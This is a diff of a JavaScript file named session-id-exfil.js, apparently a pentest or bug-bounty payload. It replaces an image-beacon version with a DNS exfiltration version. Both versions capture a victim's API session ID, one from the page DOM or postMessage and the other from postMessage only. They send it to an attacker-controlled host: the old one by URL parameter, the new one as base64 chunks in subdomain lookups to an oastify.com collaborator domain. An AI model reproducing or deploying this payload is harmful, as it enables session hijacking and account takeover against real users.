@@ -1,61 +1,58 @@
-/**
- * Session ID exfil – host on your CDN/GitHub.
- * Load with ?exfil=URL and optional &from=SOURCE so Burp shows which scenario sent it.
- * Add &debug=1 to log and set window.__exfilDebug for troubleshooting.
- */
-(function () {
-    var script = document.currentScript;
-    var exfilUrl = '';
-    var fromParam = '';
-    var debug = false;
-    if (script && script.src) {
-        try {
-            var u = new URL(script.src);
-            exfilUrl = u.searchParams.get('exfil') || u.searchParams.get('exfilUrl') || '';
-            fromParam = u.searchParams.get('from') || '';
-            debug = u.searchParams.get('debug') === '1';
-        } catch (e) {}
-    }
-    if (debug) {
-        window.__exfilDebug = { loaded: true, messageReceived: 0, exfilCalled: 0, exfilUrl: exfilUrl ? '(set)' : '(missing)' };
-        console.log('[exfil] Script loaded, listening for postMessage. Check window.__exfilDebug after a few seconds.');
-    }
-    function exfil(sid) {
-        if (!sid || !exfilUrl) return;
-        if (debug) {
-            window.__exfilDebug.exfilCalled++;
-            console.log('[exfil] exfil() called, sid length=' + (sid && sid.length), 'Total exfilCalled:', window.__exfilDebug.exfilCalled);
-        }
-        try {
-            var url = exfilUrl + encodeURIComponent(sid);
-            if (fromParam) url += '&from=' + encodeURIComponent(fromParam);
-            new Image().src = url;
-        } catch (e) {
-            if (debug) console.error('[exfil] exfil failed', e);
-        }
-    }
-    function readFromDom() {
-        var el = document.getElementById('apiSessionId') || document.querySelector('[data-api-session-id]');
-        var sid = el ? (el.value || (el.getAttribute && el.getAttribute('data-api-session-id')) || el.textContent || '').trim() : '';
-        return sid || '';
-    }
-    var sid = readFromDom();
-    if (sid) exfil(sid);
-    window.addEventListener('message', function (e) {
-        if (e.data && e.data.type === 'sessionId' && e.data.value) {
-            if (debug) {
-                window.__exfilDebug.messageReceived++;
-                console.log('[exfil] postMessage received, sid length=' + (e.data.value && String(e.data.value).length), 'Total messageReceived:', window.__exfilDebug.messageReceived);
-                alert('Script received session ID from postMessage (length: ' + (sid ? sid.length : 0) + ')');
-            }
-            exfil(String(e.data.value).trim());
-        }
-    });
-    var pollCount = 0;
-    var poll = setInterval(function () {
-        pollCount++;
-        if (pollCount > 10) { clearInterval(poll); return; }
-        sid = readFromDom();
-        if (sid) { exfil(sid); clearInterval(poll); }
-    }, 500);
-})();
+  // session-id-exfil.js - DNS Exfiltration version                                                                                                    
+  (function() {                                                                                                                                        
+      console.log('[Exfil Script] Loaded - DNS exfiltration mode');                                                                                    
+                                                                                                                                                       
+      // Get exfil URL from query params                                                                                                               
+      const params = new URLSearchParams(window.location.search || document.currentScript.src.split('?')[1]);                                          
+      const exfilUrl = params.get('exfil');                                                                                                            
+      const debug = params.get('debug') === '1';                                                                                                       
+                                                                                                                                                       
+      if (!exfilUrl) {                                                                                                                                 
+          console.error('[Exfil Script] No exfil URL provided!');                                                                                      
+          return;                                                                                                                                      
+      }                                                     
+                                                                                                                                                       
+      // Extract base domain (e.g., "xxx.oastify.com")                                                                                                 
+      const baseDomain = exfilUrl.replace(/^https?:\/\//, '').split('/')[0];                                                                           
+      console.log('[Exfil Script] Base domain:', baseDomain);                                                                                          
+                                                                                                                                                       
+      // Listen for postMessage with session ID                                                                                                        
+      window.addEventListener('message', function(event) {                                                                                             
+          if (debug) console.log('[Exfil Script] Received message:', event.data);                                                                      
+                                                                                                                                                       
+          if (event.data && event.data.type === 'sessionId' && event.data.value) {                                                                     
+              const sessionId = event.data.value;                                                                                                      
+              console.log('[Exfil Script] Session ID captured, exfiltrating via DNS...');                                                              
+                                                                                                                                                       
+              // Chunk the session ID into DNS-safe pieces (max 63 chars per label)                                                                    
+              // Base64 encode to make it DNS-safe                                                                                                     
+              const encoded = btoa(sessionId)                                                                                                          
+                  .replace(/\+/g, '-')                                                                                                                 
+                  .replace(/\//g, '_')                                                                                                                 
+                  .replace(/=/g, '');                                                                                                                  
+                                                                                                                                                       
+              // Split into chunks of 50 chars (DNS label limit is 63)                                                                                 
+              const chunks = encoded.match(/.{1,50}/g) || [];                                                                                          
+                                                                                                                                                       
+              console.log('[Exfil Script] Encoded session ID into', chunks.length, 'chunks');                                                          
+                                                                                                                                                       
+              // Send each chunk via DNS lookup                                                                                                        
+              chunks.forEach((chunk, index) => {            
+                  const subdomain = `chunk${index}-${chunk}.${baseDomain}`;                                                                            
+                  const img = new Image();                                                                                                             
+                  img.src = 'https://' + subdomain + '/x.png';                                                                                         
+                  console.log('[Exfil Script] DNS lookup:', subdomain);                                                                                
+              });                                                                                                                                      
+                                                                                                                                                       
+              // Also send a completion marker                                                                                                         
+              setTimeout(() => {                                                                                                                       
+                  const doneMarker = `done-${chunks.length}chunks.${baseDomain}`;                                                                      
+                  const img = new Image();                                                                                                             
+                  img.src = 'https://' + doneMarker + '/complete.png';                                                                                 
+                  console.log('[Exfil Script] Sent completion marker');                                                                                
+              }, 100);                                                                                                                                 
+          }                                                                                                                                            
+      });                                                                                                                                              
+                                                                                                                                                       
+      console.log('[Exfil Script] Listening for postMessage events...');                                                                               
+  })();    
